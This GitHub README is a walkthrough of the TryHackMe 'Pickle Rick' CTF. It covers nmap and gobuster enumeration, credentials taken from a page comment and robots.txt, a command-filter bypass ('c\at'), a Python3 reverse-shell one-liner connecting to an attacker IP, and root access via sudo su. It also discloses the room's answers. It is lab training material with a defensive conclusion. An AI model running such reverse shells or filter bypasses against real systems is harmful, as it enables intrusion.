
<p align="center">
<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=21&duration=3500&pause=500&center=true&vCenter=true&width=500&lines=Hello+i'm+TiXA%2C+Welcome+to+my+Repo+%F0%9F%92%96;Give+it+a+%E2%AD%90+and+share+it+with+friends!" alt="Typing SVG" /></a>
</p>

<p align="center">
  💻<B><u>THM : Pickle Rick</u></B> 💻<br>
   <b><u>Difficulty :</u> Easy ⭐</b><br>
   <b><u>Category :</u> Free ✔️</b><br>
  <b><u>Room link :</u> https://tryhackme.com/room/picklerick</b><br>
  <br>
  <img src="https://i.imgur.com/3ypKR1f.png">
</p>

Finding ingredients :bookmark_tabs:
**This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.**

## Summary 📃
- [NMAP Scan](#nmap-scan-mag_right)
- [Manual Website Enumeration](#manual-website-enumeration-eyes)
- [Gobuster Scan](#gobuster-scan-mag_right)
- [Getting a shell](#getting-a-shell-space_invader)
- [Find ingredients](#finding-ingredients-bookmark_tabs)
- [Conclusion](#Conclusion)

## NMAP Scan :mag_right:
Let's make an nmap scan using the following cmd ```sudo nmap -sV -A 10.10.181.166 -oN nmapresultat.txt```

```
sudo nmap -sV -A 10.10.181.166 -oN nmapResultsB.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 20:30 EST
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.80% done; ETC: 20:30 (0:00:02 remaining)
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:31 (0:00:06 remaining)
Nmap scan report for 10.10.181.166
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e937ce4e5167a37c1ff8cd2183a347a (RSA)
|   256 49d584943eba0fde2fcbc5c9e68e2e8a (ECDSA)
|_  256 ed31f53f7f379bb5b928adbc93f48e5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   72.42 ms 10.8.0.1
2   72.09 ms 10.10.181.166

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds
```
We notice the availability of a web server, let's visit the website to find out more informations.

## Manual website enumeration :eyes:

If we go to the index page of the website, we can see that Rick is talking about a password that he forgot.

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/2.PNG#center)

Looking at the source code of the page, we can see that Rick left a comment containing a username.  

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/1.PNG#center)

So now we have a username : `R1ckRul3s`

One of the first things I look for when i'm enumerating a website is the `robots.txt` file. So let's see if there is a robots file on this web server.  

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/3.PNG#center)

And we found a strange looking strings... It's not a page of the webserver so.. Maybe the password that Rick lost ? Let's write it down for the moment.

`Robots.txt: Wubbalubbadubdub`


## Gobuster Scan :mag_right:
Lets use gobuster to list the directories of the site

```gobuster dir -u http://10.10.181.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt -x .php,.html,.txt,.pdf```

```
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.166/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/11 20:53:12 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.10.181.166/assets/]
```

First I tried a simple gobuster scan but it didn't found any interesting pages, so I decided to try with the `-X` parameter to search for page with extensions: `php,html,txt,pdf`

```gobuster dir -u http://10.10.181.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt -x .php,.html,.txt,.pdf```

This time the enumuration was faster and gives more pages ! 

```
└─$ gobuster dir -u http://10.10.181.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt -x .php,.html,.txt,.pdf
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.166/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt,pdf,php,html
[+] Timeout:                 10s
===============================================================
2023/02/11 21:09:41 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 293]
/index.html           (Status: 200) [Size: 1062]
/.php                 (Status: 403) [Size: 292]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 315] [--> http://10.10.181.166/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```

And we found a `login.php` page ! (The portal.php page redirects us to login.php) so let's go to this page and try to login with the informations we gathered :

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/4.PNG#center)

Using `R1ckRul3s` as login and `Wubbalubbadubdub` as password, we are redirected to a `portal.php` page.  

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/5.PNG#center)


We cannot access any pages using the menu on top of the page. All tabs redirect us to `denied.php` with the following message: *Only the REAL rick can view this page..*

But on the Commands tab we have an input field that seems to be used to run commands. So let's try using `whoami`

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/6.PNG#center)

We see that we can run linux commands. So we can try to use some other commands... I tried some useful commands and , we can run `ls`, `wget`, `sudo -l`, and `cat`, but there is some filters that prevent from using some commands , like for `cat`.  

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/7.PNG#center)

We can easily bypass those filters by just putting a '\\' inside the command, like so : `c\at file_name`.  


![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/8.PNG#center)

`c\at Sup3rS3cretPickl3lngred.txt: mr. meeseek hair`

Now we have multiple choices:  

1. I could just find the different flags using this command input, using  `sudo -l`
2. Get a reverse shell. This will be more easier for searching on the machine.

Like I said, we can use sudo -l   

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/9.PNG#center)

Yes... www-data can run any commands as root, without password.

Lets use the second method and get a reverse shell on the website 

## Getting a shell :space_invader:
Let's see if pyhton3 is installed into the machine `which python3`

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/10.PNG#center)

After starting a listener on my machine i used an one liner python3 shell on the command panel

`nc -lnvp 4545`

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.69.102",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

And i got a reverse shell which i stabilized using the following commands 

```
export TERM=xterm
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty -echo raw;fg
```
And then i did `sudo su` to get a shell as root.


## Finding ingredients :bookmark_tabs: 

Now I can get the 3 ingredients for the potion that Rick needs :  

1. What is the first ingredient Rick needs ? : `ls ==> cat Sup3rS3cretPickl3Ingred.txt`  

2. Whats the second ingredient Rick needs ? : `cd /home/rick/ ==> ls ==> cat second\ ingredients`

3. Whats the final ingredient Rick needs ? : `cd /root ==> ls ==> cat 3rd.txt`  


## Conclusion 

- In this CTF, we see that it can be useful to read the source code of pages on a web server, we can find useful informations, even if there is no credentials we can find CMS versions, links to other pages.  

- Even if there is filters on command input, there is sometimes a way to bypass it, as was the case with `cat ==> c\at`

- We also noticed that it is very easy for an attacker to get a full control of the machine if the user `www-data` has too much permissions more than necessary, i was able to do `sudo -l` to check that i have all permissions to do `sudo su` without password. So it is very important to manage permissions properly.

- `www-data` should not :x: have the right to run any command as root.

---

<p align="center">
<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=21&duration=3500&pause=500&center=true&vCenter=true&multiline=true&width=500&height=80&lines=Made+with+%F0%9F%92%96+If+you+like+this+project%2C+;give+it+a+%E2%AD%90+and+share+it+with+friends!" alt="Typing SVG" /></a>
</p>

<u>**My networks :**</u> 

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/nazim-hamaoui/)      [![Tryhackme](https://i.imgur.com/gLYq8Bm.png)](https://tryhackme.com/p/TiXA)


---
